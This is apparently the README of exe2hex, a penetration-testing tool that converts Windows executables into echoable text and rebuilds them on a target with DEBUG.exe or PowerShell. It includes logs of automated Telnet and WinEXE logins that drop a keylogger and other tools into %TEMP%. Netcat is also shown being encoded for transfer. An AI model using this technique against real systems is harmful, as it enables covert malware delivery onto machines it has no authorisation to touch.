# exe2hex

Inline file transfer using in-built Windows tools (`DEBUG.exe` or PowerShell).

<p align="center">
  <img src="http://i.imgur.com/n6Op45O.png" alt="exe2hex logo"/>
</p>

- - -

### Overview

exe2hex encodes an executable binary file into ASCII text format.

The result then can be transferred to the target machine (It is much easier to echo a ASCII file than binary data).

Upon executing exe2hex's output file, the original program is restored by using `DEBUG.exe` or PowerShell (which are pre-installed by default on Windows).

Can be automated by using either the in-built Telnet or WinEXE options in exe2hex to transfer the file over to the target machine, else the output can manually be inserted.

```Binary EXE -> ASCII Text -> *Transfer* -> Binary EXE```

![](https://i.imgur.com/vAmiyj9.png)

- - -

### Quick Guide

 + Input using a file (`-x /path/to/binary-program.exe`) or STDIN (`-s`)
 + Output to BATch (`-b file.bat`) and/or PoSH (`-p powershell.cmd`)

#### Example Usage

**Create BATch & PowerShell files**:
```bash
$ python3 exe2hex.py -x /usr/share/windows-binaries/sbd.exe
[*] exe2hex v1.5
[i] Outputting to /root/sbd.bat (BATch) and /root/sbd.cmd (PoSh)
[+] Successfully wrote (BATch) /root/sbd.bat
[+] Successfully wrote (PoSh) /root/sbd.cmd
$
```

**Compress the file before creating a BATch file**:
```bash
$ ./exe2hex.py -x /usr/share/windows-binaries/nc.exe -b /var/www/html/nc.txt -cc
[*] exe2hex v1.5
[i] Attempting to clone and compress
[i] Creating temporary file /tmp/tmpft9tmm_i
[+] Compression (strip) was successful! (0.0% saved)
[+] Compression (UPX) was successful! (50.9% saved)
[+] Successfully wrote (BATch) /var/www/html/nc.txt
$
```

**Use STDIN to create BATch & PowerShell files**:
```bash
$ cat /usr/share/windows-binaries/whoami.exe | python3 exe2hex.py -s -b debug.bat -p ps.cmd
[*] exe2hex v1.5
[i] Reading from STDIN
[+] Successfully wrote (BATch) /root/debug.bat
[+] Successfully wrote (PoSh) /root/ps.cmd
$
```

#### Help

```bash
$ python3 exe2hex.py
[*] exe2hex v1.5

Encodes an executable binary file into ASCII text format
Restore using DEBUG.exe (BATch - x86) or PowerShell (PoSh - x86/x64)

Quick Guide:
 + Input binary file with -s or -x
 + Output with -b and/or -p
Example:
 $ /usr/bin/exe2hex -x /usr/share/windows-binaries/sbd.exe
 $ /usr/bin/exe2hex -x /usr/share/windows-binaries/nc.exe -b /var/www/html/nc.txt -cc
 $ cat /usr/share/windows-binaries/whoami.exe | /usr/bin/exe2hex -s -b debug.bat -p ps.cmd

--- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

Usage: exe2hex [options]

Options:
  -h, --help  show this help message and exit
  -x EXE      The EXE binary file to convert
  -s          Read from STDIN
  -b BAT      BAT output file (DEBUG.exe method - x86)
  -p POSH     PoSh output file (PowerShell method - x86/x64)
  -e          URL encode the output
  -r TEXT     pRefix - text to add before the command on each line
  -f TEXT     suFfix - text to add after the command on each line
  -l INT      Maximum HEX values per line
  -c          Clones and compress the file before converting (-cc for higher
              compression)
  -t          Create a Expect file, to automate to a Telnet session.
  -w          Create a Expect file, to automate to a WinEXE session.
  -v          Enable verbose mode
$
```

- - -

### Methods/OS Support

+ **`DEBUG.exe` (BATch mode - `-b`)**
  + Supports x86 OSs (No x64 support).
  + Useful for legacy versions of Windows (e.g. Windows XP/Windows 2000).
    + Pre-installed by default. Works out of the box.
  + ~~Limitation of 64k file size for binary programs.~~ Creates multiple parts and joins with `copy /b` so this is not an issue anymore!
+ **PowerShell (PoSh mode - `-p`)**
  + Supports both x86 & x64 OSs.
  + Aimed at more "recent" versions of Windows.
    + PowerShell was first integrated into core OS with Windows 7/Windows Server 2008 R2.
    + Windows XP SP2, Windows Server 2003 & Windows Vista requires PowerShell to be pre-installed.
  + This is **not** a `.ps1` file (pure PowerShell). It only calls PowerShell at the end.

- - -

### Features

**Primary purpose**: Convert a binary program into a ASCII HEX file which can be restored using in-built OS programs.

+ Work on old and new versions of Windows without requiring any 3rd party programs to be pre-installed.
+ Supports x86 & x64 OSs.
+ Can use DEBUG.exe or PowerShell to restore the file.
+ Able to compress the file before converting.
+ URL encode the output.
+ The option to add prefix and suffix text to each line.
+ Able to set a maximum HEX length per line.
+ Can use a binary file or pipe from standard input (`STDIN`).
+ Automate transfers over Telnet and/or WinEXE.


Note: This is nothing new. [The core idea (using DEBUG.exe for inline file transfer) has been around since 2003](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-chong.pdf) _(if not earlier!)_.

- - -

### Telnet

When pasting a large amount of data (100+ lines) directly into a Telnet session, the results can be "unpredictable". Behaviours include lines being executed in a incorrect order or characters are just completely skipped.

A solution is to use "[Expect](http://expect.sourceforge.net/)" (which is an extension of [TCL](https://sourceforge.net/projects/tcl/)). Expect can be found in a most major Linux OSs repositories (`apt-get -y install expect` / `yum -y install expect` / `pacman -S expect`). Upon executing exe2hex's Telnet script, Expect will automate the Telnet login (based on the arguments used), look for a writeable folder (e.g. defaults to the system variable, `%TEMP%`) and then start inputting commands from exe2hex's output file, line by line one at a time. If required, the variables at the top of the Expect script can be manually edited (to use a different Telnet port, path, or command prompt).

An example of exe2hex's Telnet mode can be seen below:

```bash
$ python3 exe2hex.py -x /usr/share/windows-binaries/klogger.exe -b klogger.bat -t
[*] exe2hex v1.5
[+] Successfully wrote (BATch) /root/klogger.bat
[+] Successfully wrote (Expect) /root/klogger-bat-telnet
$
$ expect /root/klogger-bat-telnet
Usage: ./klogger-bat-telnet <ip> <username> <password>
$
$ /root/klogger-bat-telnet 192.168.103.148 winxp pass123

spawn telnet 192.168.103.148

Trying 192.168.103.148...
Connected to 192.168.103.148.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: winxp
password:

*===============================================================
Welcome to Microsoft Telnet Server.
*===============================================================
C:\Documents and Settings\winxp>cd %TEMP%
C:\DOCUME~1\winxp\LOCALS~1\Temp>echo 418671.0>klogger.bat
418671.0E~1\winxp\LOCALS~1\Temp>type klogger.bat

C:\DOCUME~1\winxp\LOCALS~1\Temp>

[i] Writeable folder!

C:\DOCUME~1\winxp\LOCALS~1\Temp>del /F klogger.bat
Runs Debug, a program testing and editing tool.

DEBUG [[drive:][path]filename [testfile-parameters]]

  [drive:][path]filename  Specifies the file you want to test.
  testfile-parameters     Specifies command-line information required by
                          the file you want to test.

After Debug starts, type ? to display a list of debugging commands.

C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 1/382)
if NOT %ERRORLEVEL% == 0 echo &echo &echo &echo **** **** **** **** ****&echo *** Missing DEBUG.exe ***&echo **** **** **** **** ****&exit /b
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 2/382)
echo n klogger.0>klogger.hex
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 3/382)
echo e 0100>>klogger.hex
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 4/382)
echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00>>klogger.hex
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 5/382)
echo e 0180>>klogger.hex


...SNIP...

C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 376/382)
move /Y klogger.0 klogger.exe
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 377/382)
echo. >klogger.hex
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 378/382)
del /F /Q klogger.hex klogger.0
C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 379/382)
 Volume in drive C has no label.
 Volume Serial Number is 002C-A3B2

 Directory of C:\DOCUME~1\winxp\LOCALS~1\Temp

06/09/2017  10:19 AM            23,552 klogger.exe
               1 File(s)         23,552 bytes
               0 Dir(s)  40,501,571,584 bytes free

C:\DOCUME~1\winxp\LOCALS~1\Temp>C:\DOCUME~1\winxp\LOCALS~1\Temp>   (Progress: 380/382)


[i] Done

C:\DOCUME~1\winxp\LOCALS~1\Temp>
```


### WinEXE

Like the Telnet mode (`-t`), exe2hex can automate using winexe to transfer files across, inline, using expect:

```bash
$ python3 exe2hex.py -x /usr/share/windows-binaries/mbenum/mbenum.exe -p mbenum.cmd -w
[*] exe2hex v1.5
[+] Successfully wrote (PoSh) /root/mbenum.cmd
[+] Successfully wrote (Expect) /root/mbenum-posh-winexe
$
$ expect /root/mbenum-posh-winexe
Usage: ./mbenum-posh-winexe <ip> <username> <password>
$
$ ./mbenum-posh-winexe 192.168.103.147 win7 123456789

spawn winexe -U win7%123456789 //192.168.103.147 cmd.exe

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd %TEMP%
cd %TEMP%

C:\Windows\Temp>echo 656082.0>mbenum.cmd
echo 656082.0>mbenum.cmd

C:\Windows\Temp>type mbenum.cmd
type mbenum.cmd
656082.0

[i] Writeable folder!


C:\Windows\Temp>del /F mbenum.cmd
del /F mbenum.cmd

C:\Windows\Temp>echo|set /p="">mbenum.hex

echo|set /p="">mbenum.hex

C:\Windows\Temp>   (Progress: 1/388)

C:\Windows\Temp>echo|set /p="4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000">>mbenum.hex

echo|set /p="4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000">>mbenum.hex

C:\Windows\Temp>   (Progress: 2/388)

C:\Windows\Temp>echo|set /p="fa28c48dbe49aadebe49aadebe49aadec555a6debf49aaded156a1debf49aade3d55a4deae49aaded156a0de8b49aade3d41f7debb49aadebe49abde9049aadeb86aa0debc49aade52696368be49aade000000000000000000000000000000000000000000000000504500004c01030001ea7f3f0000000000000000e0000f01">>mbenum.hex

...SNIP...

C:\Windows\Temp>   (Progress: 385/388)

C:\Windows\Temp>powershell -Command "$h=Get-Content -readcount 0 -path './mbenum.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'mbenum.exe' -value $b;Remove-Item -force mbenum.hex;Get-ChildItem mbenum.exe;"

powershell -Command "$h=Get-Content -readcount 0 -path './mbenum.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'mbenum.exe' -value $b;Remove-Item -force mbenum.hex;Get-ChildItem mbenum.exe;"


   (Progress: 386/388)ows\Temp


[i] Done



Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        09/06/2017     10:21      49152 mbenum.exe




C:\Windows\Temp>
```

_NOTE: May need to press enter to get a prompt back at the end._

- - -

## Install

Just exe2hex just requires [Python 3](https://www.python.org/) to function ([Expect](http://expect.sourceforge.net/) is optional for Telnet and WinEXE functions).

Simply add exe2hex a folder in your `$PATH` variable:

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ curl -k -L "https://raw.githubusercontent.com/g0tmi1k/exe2hex/master/exe2hex.py" > /usr/local/bin/exe2hex
$ chmod 0755 /usr/local/bin/exe2hex
```

### Kali-Linux

exe2hex is already [packaged](https://pkg.kali.org/pkg/exe2hexbat) in [Kali Rolling](https://www.kali.org/), so all you have to-do is:

```bash
root@kali:~# apt install -y exe2hexbat
```
